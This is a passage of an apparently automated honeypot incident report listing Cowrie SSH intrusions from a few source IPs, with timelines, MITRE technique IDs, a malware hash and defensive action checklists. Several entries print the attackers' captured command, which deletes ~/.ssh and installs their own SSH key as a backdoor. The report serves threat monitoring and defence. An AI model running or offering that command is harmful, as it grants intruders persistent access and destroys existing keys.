| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:02:55` | `cowrie.session.connect` |
| `2026-06-12 22:02:55` | `cowrie.client.version` |
| `2026-06-12 22:02:55` | `cowrie.client.kex` |
| `2026-06-12 22:02:56` | `cowrie.login.success` |
| `2026-06-12 22:02:57` | `cowrie.session.params` |
| `2026-06-12 22:02:57` | `cowrie.command.input` |
| `2026-06-12 22:02:57` | `cowrie.command.failed` |
| `2026-06-12 22:02:57` | `cowrie.log.closed` |
| `2026-06-12 22:02:58` | `cowrie.session.params` |
| `2026-06-12 22:02:58` | `cowrie.command.input` |
| `2026-06-12 22:02:58` | `cowrie.session.file_download` |
| `2026-06-12 22:02:58` | `cowrie.log.closed` |
| `2026-06-12 22:03:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.244.74[.]84` to AbuseIPDB if not already reported
- [ ] Block `104.244.74[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-517139a896d8

| Field | Detail |
|---|---|
| **Source IP** | `104.244.74[.]84` |
| **First Seen** | 2026-06-12 22:03 |
| **Last Seen** | 2026-06-12 22:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:03:00` | `cowrie.session.connect` |
| `2026-06-12 22:03:00` | `cowrie.client.version` |
| `2026-06-12 22:03:01` | `cowrie.client.kex` |
| `2026-06-12 22:03:02` | `cowrie.login.success` |
| `2026-06-12 22:03:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.244.74[.]84` to AbuseIPDB if not already reported
- [ ] Block `104.244.74[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a828576999ba

| Field | Detail |
|---|---|
| **Source IP** | `139.84.243[.]79` |
| **First Seen** | 2026-06-12 22:05 |
| **Last Seen** | 2026-06-12 22:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:05:09` | `cowrie.session.connect` |
| `2026-06-12 22:05:09` | `cowrie.client.version` |
| `2026-06-12 22:05:09` | `cowrie.client.kex` |
| `2026-06-12 22:05:10` | `cowrie.login.success` |
| `2026-06-12 22:05:11` | `cowrie.session.params` |
| `2026-06-12 22:05:11` | `cowrie.command.input` |
| `2026-06-12 22:05:11` | `cowrie.command.failed` |
| `2026-06-12 22:05:11` | `cowrie.log.closed` |
| `2026-06-12 22:05:12` | `cowrie.session.params` |
| `2026-06-12 22:05:12` | `cowrie.command.input` |
| `2026-06-12 22:05:12` | `cowrie.session.file_download` |
| `2026-06-12 22:05:12` | `cowrie.log.closed` |
| `2026-06-12 22:05:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.84.243[.]79` to AbuseIPDB if not already reported
- [ ] Block `139.84.243[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9f87833524f

| Field | Detail |
|---|---|
| **Source IP** | `139.84.243[.]79` |
| **First Seen** | 2026-06-12 22:05 |
| **Last Seen** | 2026-06-12 22:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:05:15` | `cowrie.session.connect` |
| `2026-06-12 22:05:15` | `cowrie.client.version` |
| `2026-06-12 22:05:15` | `cowrie.client.kex` |
| `2026-06-12 22:05:17` | `cowrie.login.success` |
| `2026-06-12 22:05:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.84.243[.]79` to AbuseIPDB if not already reported
- [ ] Block `139.84.243[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-378aa6d8fc30

| Field | Detail |
|---|---|
| **Source IP** | `139.84.243[.]79` |
| **First Seen** | 2026-06-12 22:07 |
| **Last Seen** | 2026-06-12 22:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:07:18` | `cowrie.session.connect` |
| `2026-06-12 22:07:18` | `cowrie.client.version` |
| `2026-06-12 22:07:19` | `cowrie.client.kex` |
| `2026-06-12 22:07:20` | `cowrie.login.success` |
| `2026-06-12 22:07:20` | `cowrie.session.params` |
| `2026-06-12 22:07:20` | `cowrie.command.input` |
| `2026-06-12 22:07:20` | `cowrie.command.failed` |
| `2026-06-12 22:07:21` | `cowrie.log.closed` |
| `2026-06-12 22:07:21` | `cowrie.session.params` |
| `2026-06-12 22:07:21` | `cowrie.command.input` |
| `2026-06-12 22:07:21` | `cowrie.session.file_download` |
| `2026-06-12 22:07:21` | `cowrie.log.closed` |
| `2026-06-12 22:07:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.84.243[.]79` to AbuseIPDB if not already reported
- [ ] Block `139.84.243[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f22f9d04ba2e

| Field | Detail |
|---|---|
| **Source IP** | `139.84.243[.]79` |
| **First Seen** | 2026-06-12 22:07 |
| **Last Seen** | 2026-06-12 22:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:07:25` | `cowrie.session.connect` |
| `2026-06-12 22:07:25` | `cowrie.client.version` |
| `2026-06-12 22:07:25` | `cowrie.client.kex` |
| `2026-06-12 22:07:26` | `cowrie.login.success` |
| `2026-06-12 22:07:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.84.243[.]79` to AbuseIPDB if not already reported
- [ ] Block `139.84.243[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32f11d117ec6

| Field | Detail |
|---|---|
| **Source IP** | `104.244.74[.]84` |
| **First Seen** | 2026-06-12 22:12 |
| **Last Seen** | 2026-06-12 22:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:12:42` | `cowrie.session.connect` |
| `2026-06-12 22:12:42` | `cowrie.client.version` |
| `2026-06-12 22:12:43` | `cowrie.client.kex` |
| `2026-06-12 22:12:43` | `cowrie.login.success` |
| `2026-06-12 22:12:44` | `cowrie.session.params` |
| `2026-06-12 22:12:44` | `cowrie.command.input` |
| `2026-06-12 22:12:44` | `cowrie.command.failed` |
| `2026-06-12 22:12:44` | `cowrie.log.closed` |
| `2026-06-12 22:12:45` | `cowrie.session.params` |
| `2026-06-12 22:12:45` | `cowrie.command.input` |
| `2026-06-12 22:12:45` | `cowrie.session.file_download` |
| `2026-06-12 22:12:45` | `cowrie.log.closed` |
| `2026-06-12 22:12:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.244.74[.]84` to AbuseIPDB if not already reported
- [ ] Block `104.244.74[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-286e8712d0db

| Field | Detail |
|---|---|
| **Source IP** | `104.244.74[.]84` |
| **First Seen** | 2026-06-12 22:12 |
| **Last Seen** | 2026-06-12 22:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:12:47` | `cowrie.session.connect` |
| `2026-06-12 22:12:47` | `cowrie.client.version` |
| `2026-06-12 22:12:48` | `cowrie.client.kex` |
| `2026-06-12 22:12:49` | `cowrie.login.success` |
| `2026-06-12 22:12:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.244.74[.]84` to AbuseIPDB if not already reported
- [ ] Block `104.244.74[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c754ee9047e7

| Field | Detail |
|---|---|
| **Source IP** | `104.244.74[.]84` |
| **First Seen** | 2026-06-12 22:14 |
| **Last Seen** | 2026-06-12 22:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:14:36` | `cowrie.session.connect` |
| `2026-06-12 22:14:36` | `cowrie.client.version` |
| `2026-06-12 22:14:37` | `cowrie.client.kex` |
| `2026-06-12 22:14:37` | `cowrie.login.success` |
| `2026-06-12 22:14:38` | `cowrie.session.params` |
| `2026-06-12 22:14:38` | `cowrie.command.input` |
| `2026-06-12 22:14:38` | `cowrie.command.failed` |
| `2026-06-12 22:14:38` | `cowrie.log.closed` |
| `2026-06-12 22:14:39` | `cowrie.session.params` |
| `2026-06-12 22:14:39` | `cowrie.command.input` |
| `2026-06-12 22:14:39` | `cowrie.session.file_download` |
| `2026-06-12 22:14:39` | `cowrie.log.closed` |
| `2026-06-12 22:14:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.244.74[.]84` to AbuseIPDB if not already reported
- [ ] Block `104.244.74[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2139c9f567d

| Field | Detail |
|---|---|
| **Source IP** | `104.244.74[.]84` |
| **First Seen** | 2026-06-12 22:14 |
| **Last Seen** | 2026-06-12 22:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:14:42` | `cowrie.session.connect` |
| `2026-06-12 22:14:42` | `cowrie.client.version` |
| `2026-06-12 22:14:42` | `cowrie.client.kex` |
| `2026-06-12 22:14:43` | `cowrie.login.success` |
| `2026-06-12 22:14:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.244.74[.]84` to AbuseIPDB if not already reported
- [ ] Block `104.244.74[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9436bfd0f666

| Field | Detail |
|---|---|
| **Source IP** | `104.244.74[.]84` |
| **First Seen** | 2026-06-12 22:16 |
| **Last Seen** | 2026-06-12 22:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:16:34` | `cowrie.session.connect` |
| `2026-06-12 22:16:34` | `cowrie.client.version` |
| `2026-06-12 22:16:34` | `cowrie.client.kex` |
| `2026-06-12 22:16:35` | `cowrie.login.success` |
| `2026-06-12 22:16:35` | `cowrie.session.params` |
| `2026-06-12 22:16:35` | `cowrie.command.input` |
| `2026-06-12 22:16:35` | `cowrie.command.failed` |
| `2026-06-12 22:16:36` | `cowrie.log.closed` |
| `2026-06-12 22:16:36` | `cowrie.session.params` |
| `2026-06-12 22:16:36` | `cowrie.command.input` |
| `2026-06-12 22:16:36` | `cowrie.session.file_download` |
| `2026-06-12 22:16:36` | `cowrie.log.closed` |
| `2026-06-12 22:16:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.244.74[.]84` to AbuseIPDB if not already reported
- [ ] Block `104.244.74[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-070bd2bf104d

| Field | Detail |
|---|---|
| **Source IP** | `104.244.74[.]84` |
| **First Seen** | 2026-06-12 22:16 |
| **Last Seen** | 2026-06-12 22:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:16:39` | `cowrie.session.connect` |
| `2026-06-12 22:16:39` | `cowrie.client.version` |
| `2026-06-12 22:16:39` | `cowrie.client.kex` |
| `2026-06-12 22:16:40` | `cowrie.login.success` |
| `2026-06-12 22:16:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.244.74[.]84` to AbuseIPDB if not already reported
- [ ] Block `104.244.74[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fad8aeed6dc

| Field | Detail |
|---|---|
| **Source IP** | `104.244.74[.]84` |
| **First Seen** | 2026-06-12 22:18 |
| **Last Seen** | 2026-06-12 22:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:18:28` | `cowrie.session.connect` |
| `2026-06-12 22:18:28` | `cowrie.client.version` |
| `2026-06-12 22:18:29` | `cowrie.client.kex` |
| `2026-06-12 22:18:29` | `cowrie.login.success` |
| `2026-06-12 22:18:30` | `cowrie.session.params` |
| `2026-06-12 22:18:30` | `cowrie.command.input` |
| `2026-06-12 22:18:30` | `cowrie.command.failed` |
| `2026-06-12 22:18:30` | `cowrie.log.closed` |
| `2026-06-12 22:18:31` | `cowrie.session.params` |
| `2026-06-12 22:18:31` | `cowrie.command.input` |
| `2026-06-12 22:18:31` | `cowrie.session.file_download` |
| `2026-06-12 22:18:31` | `cowrie.log.closed` |
| `2026-06-12 22:18:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.244.74[.]84` to AbuseIPDB if not already reported
- [ ] Block `104.244.74[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c0c7fa5eeee

| Field | Detail |
|---|---|
| **Source IP** | `104.244.74[.]84` |
| **First Seen** | 2026-06-12 22:18 |
| **Last Seen** | 2026-06-12 22:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:18:34` | `cowrie.session.connect` |
| `2026-06-12 22:18:34` | `cowrie.client.version` |
| `2026-06-12 22:18:34` | `cowrie.client.kex` |
| `2026-06-12 22:18:35` | `cowrie.login.success` |
| `2026-06-12 22:18:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.244.74[.]84` to AbuseIPDB if not already reported
- [ ] Block `104.244.74[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6195f53aa9b2

| Field | Detail |
|---|---|
| **Source IP** | `104.244.74[.]84` |
| **First Seen** | 2026-06-12 22:24 |
| **Last Seen** | 2026-06-12 22:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:24:23` | `cowrie.session.connect` |
| `2026-06-12 22:24:23` | `cowrie.client.version` |
| `2026-06-12 22:24:23` | `cowrie.client.kex` |
| `2026-06-12 22:24:24` | `cowrie.login.success` |
| `2026-06-12 22:24:25` | `cowrie.session.params` |
| `2026-06-12 22:24:25` | `cowrie.command.input` |
| `2026-06-12 22:24:25` | `cowrie.command.failed` |
| `2026-06-12 22:24:25` | `cowrie.log.closed` |
| `2026-06-12 22:24:25` | `cowrie.session.params` |
| `2026-06-12 22:24:25` | `cowrie.command.input` |
| `2026-06-12 22:24:25` | `cowrie.session.file_download` |
| `2026-06-12 22:24:25` | `cowrie.log.closed` |
| `2026-06-12 22:24:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.244.74[.]84` to AbuseIPDB if not already reported
- [ ] Block `104.244.74[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce0ccb8bb427

| Field | Detail |
|---|---|
| **Source IP** | `104.244.74[.]84` |
| **First Seen** | 2026-06-12 22:24 |
| **Last Seen** | 2026-06-12 22:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:24:28` | `cowrie.session.connect` |
| `2026-06-12 22:24:28` | `cowrie.client.version` |
| `2026-06-12 22:24:28` | `cowrie.client.kex` |
| `2026-06-12 22:24:29` | `cowrie.login.success` |
| `2026-06-12 22:24:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.244.74[.]84` to AbuseIPDB if not already reported
- [ ] Block `104.244.74[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42bc3c4c6ed8

| Field | Detail |
|---|---|
| **Source IP** | `43.164.190[.]64` |
| **First Seen** | 2026-06-12 22:28 |
| **Last Seen** | 2026-06-12 22:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:28:11` | `cowrie.session.connect` |
| `2026-06-12 22:28:11` | `cowrie.client.version` |
| `2026-06-12 22:28:11` | `cowrie.client.kex` |
| `2026-06-12 22:28:12` | `cowrie.login.success` |
| `2026-06-12 22:28:12` | `cowrie.session.params` |
| `2026-06-12 22:28:12` | `cowrie.command.input` |
| `2026-06-12 22:28:12` | `cowrie.command.failed` |
| `2026-06-12 22:28:12` | `cowrie.log.closed` |
| `2026-06-12 22:28:12` | `cowrie.session.params` |
| `2026-06-12 22:28:12` | `cowrie.command.input` |
| `2026-06-12 22:28:12` | `cowrie.session.file_download` |
| `2026-06-12 22:28:12` | `cowrie.log.closed` |
| `2026-06-12 22:28:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.190[.]64` to AbuseIPDB if not already reported
- [ ] Block `43.164.190[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfa935570d53

| Field | Detail |
|---|---|
| **Source IP** | `43.164.190[.]64` |
| **First Seen** | 2026-06-12 22:28 |
| **Last Seen** | 2026-06-12 22:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

